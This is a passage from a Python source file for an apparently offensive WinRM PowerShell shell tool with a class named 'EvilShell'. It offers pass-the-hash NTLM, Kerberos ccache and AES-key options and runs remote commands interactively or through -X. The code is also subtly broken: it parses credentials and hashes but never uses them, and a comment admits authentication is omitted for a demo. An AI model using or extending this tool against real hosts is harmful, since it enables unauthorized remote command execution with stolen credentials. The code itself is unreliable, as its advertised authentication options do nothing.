            with open(dst, "wb") as f:
                f.write(data if len(buf) >= 32 else buf)
        except IOError as e:
            self.write_error(str(e))

# -------------------------------------------------------------------------
# Argument Parser and Main Function
# -------------------------------------------------------------------------

def argument_parser():
    parser = ArgumentParser(
        description='WinRM PowerShell Execution Tool',
        formatter_class=RawTextHelpFormatter
    )
    
    # Target specification
    parser.add_argument('target', action='store', 
                       help='[[domain/]username[:password]@]<targetName or address>')
    
    # Connection options
    parser.add_argument('-debug', action='store_true', 
                       help='Turn DEBUG output ON')
    parser.add_argument('-timeout', default='30', 
                       help='Set connection timeout in seconds (default: 30)')
    parser.add_argument('-ts', action='store_true', 
                       help='Adds timestamp to every logging output')
    
    # Authentication options
    parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", 
                       help='NTLM hashes, format is LMHASH:NTHASH')
    parser.add_argument('-no-pass', action="store_true", 
                       help='Don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", 
                       help='Use Kerberos authentication. Grabs credentials from ccache file')
    parser.add_argument('-aesKey', action="store", metavar="hex key", 
                       help='AES key to use for Kerberos Authentication')
    parser.add_argument('-dc-ip', action='store', metavar="ip address", 
                       help='IP Address of the domain controller')
    
    # Execution options
    parser.add_argument('-X', action='store', metavar="command", 
                       help='Execute the specified command and exit')
    
    # SSL options
    parser.add_argument('-ssl', action='store_true',
                       help='Use SSL/TLS (default: False)')
    
    return parser

def create_transport(args):
    # Parse target
    if IMPACKET_AVAILABLE:
        domain, username, password, address = parse_target(args.target)
    else:
        # Simple parsing if impacket not available
        if '@' in args.target:
            creds, address = args.target.rsplit('@', 1)
            if ':' in creds:
                if '/' in creds:
                    domain, userpass = creds.split('/', 1)
                    username, password = userpass.split(':', 1) if ':' in userpass else (userpass, '')
                else:
                    domain = ''
                    username, password = creds.split(':', 1) if ':' in creds else (creds, '')
            else:
                domain = ''
                username = creds
                password = ''
        else:
            domain = ''
            username = ''
            password = ''
            address = args.target
    
    # Create transport
    use_ssl = args.ssl if hasattr(args, 'ssl') else False
    port = 5986 if use_ssl else 5985
    
    transport = WinRMTransport(address, port, use_ssl, int(args.timeout))
    
    # Connect
    if not transport.connect():
        raise WinRMException(f"Failed to connect to {address}:{port}")
    
    # Simple authentication (in real implementation, you'd add NTLM/Kerberos here)
    # For this demo, we'll assume the server allows unauthenticated or basic auth
    
    return transport

def main():
    if not CRYPTO_AVAILABLE:
        print("[!] PyCryptodome is required. Install with: pip install pycryptodome")
        sys.exit(1)
    
    args = argument_parser().parse_args()
    
    # Setup logging
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s' if args.ts else '[%(levelname)s] %(message)s'
    )
    
    if IMPACKET_AVAILABLE and args.debug:
        logging.debug(f"Impacket installation path: {version.getInstallationPath()}")
    
    try:
        # Create transport and runspace
        transport = create_transport(args)
        
        with Runspace(transport, int(args.timeout)) as runspace:
            shell = EvilShell(runspace)
            
            try:
                if args.X:
                    # Execute single command
                    shell.repl(iter([args.X]))
                else:
                    # Interactive shell
                    shell.help()
                    shell.repl()
            except EOFError:
                pass
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
            except Exception as e:
                print(f"[!] Error: {e}")
                if args.debug:
                    import traceback
                    traceback.print_exc()
    
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

# -------------------------------------------------------------------------
# Entry Point
# -------------------------------------------------------------------------

if __name__ == "__main__":
    main()